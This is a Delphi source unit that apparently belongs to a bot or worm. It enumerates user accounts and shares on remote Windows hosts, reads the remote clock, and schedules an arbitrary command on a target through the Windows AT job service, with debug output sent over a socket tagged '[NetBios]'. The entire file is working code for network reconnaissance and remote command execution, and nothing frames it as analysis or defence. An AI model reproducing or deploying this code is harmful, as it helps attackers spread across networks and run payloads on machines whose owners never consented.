unit nt;

{$include def.mor}

interface

Uses Windows,Classes;

Function NetScheduleJobDO(Host,exec:string;Min:Integer):Boolean;
Procedure GetUsers(aServer: string;var res:Tstringlist);
Procedure GetShares(aServer: string;var res:Tstringlist);

implementation

uses sysutils,DateUtils,JwaLmAt,JwaLM,stuff,JwaLmShare;

Procedure GetUsers;
var
  ui1, pWork: Pointer;
  EntriesRead, EntriesTotal: DWORD;
  NetError: DWORD;
  Loop: Integer;
begin
  pWork := nil;
  try
    NetError := NetUserEnum(PWideChar(WideString(aServer)), 0,
      0, ui1, MAX_PREFERRED_LENGTH, EntriesRead,
      EntriesTotal, nil);
    if NetError = NERR_SUCCESS then
    begin
      pWork := ui1;
      for Loop := 0 to EntriesRead - 1 do
      begin
        res.add(PUserInfo1(ui1)^.usri1_name);
        Inc(Integer(ui1), sizeof(Pointer));
      end;
    end;
  finally
    NetApiBufferFree(pWork);
end;
end;

Procedure GetShares;
var
  ui1: pbyte;
  EntriesRead, EntriesTotal: DWORD;
  NetError: DWORD;
  Loop: Integer;
  P:PShareInfo2;
begin
  try
    NetError := NetShareEnum(PWideChar(WideString(aServer)), 2, ui1, MAX_PREFERRED_LENGTH, @EntriesRead,
      @EntriesTotal, nil);
    if NetError = NERR_SUCCESS then
    begin
      p:=PShareInfo2(ui1);
      for Loop := 0 to EntriesRead - 1 do
      begin
        if not (lowercase(WideCharToString(p^.shi2_netname)) = 'ipc$') then
        res.add(Lowercase(WideCharToString(p^.shi2_netname)));
        inc(p);
      end;
    end;
  finally
    NetApiBufferFree(ui1);
end;
end;


Function GetRemoteTime(Host:string;var TTime:longint):boolean;
var
    Rek        :PTimeOfDayInfo;
    sex:integer;
    dt: TDateTime;
begin
sex:=NetRemoteTOD(PWideChar(WideString(host)),@rek);   // '' = local computer
if sex = NERR_Success then
begin
  dt:=EncodeTime(integer(rek^.tod_hours),integer(rek^.tod_mins),integer(rek^.tod_secs),0);
  if integer(rek^.tod_timezone) < 0 then
    dt := dt + ((1/24) * (abs(integer(rek^.tod_timezone)) div 60));
  if integer(rek^.tod_timezone) > 0 then
    dt := dt + ((1/24) * -abs(integer(rek^.tod_timezone) div 60));
  ttime:=(integer(HourOf(dt)) * 60 * 60 * 1000) + (integer(rek^.tod_mins) * 60 * 1000);
  {$ifdef debug}
    SendSock('[NetBios] Got Remote Time (Zone: '+inttostr(rek^.tod_timezone)+' H/M: '+inttostr(rek^.tod_hours)+'/'+inttostr(rek^.tod_mins)+' Total: '+inttostr(HourOf(dt))+':'+inttostr(rek^.tod_mins)+')');
  {$endif}
  result:=true;
end
else
 Result:=false;
NetApiBufferFree(rek);
end;

Function NetScheduleJobDO;
var
  ATInfo:_AT_INFO;
  Dtime:longint;
  id:dword;
  ret:integer;
begin
  if GetRemoteTime(Host,dtime) then
  atinfo.jobtime:=dtime + (min * 60 * 1000) // we add X min to remote time.
  else
  atinfo.jobtime:=((integer(HourOf(time)) * 60 * 60 * 1000) + (integer(MinuteOf(time))*60*1000) + (min * 60 * 1000));  // X Min + Currect time.
  atinfo.DaysOfMonth:=0;
  atinfo.DaysOfWeek:=0;
  atinfo.command:=PWideChar(WideString(exec));
  ret:=NetScheduleJobAdd(PWideChar(WideString(host)),@ATInfo,id);
  if ret = NERR_Success then
    Result:=True
  else
    result:=false;
end;
end.
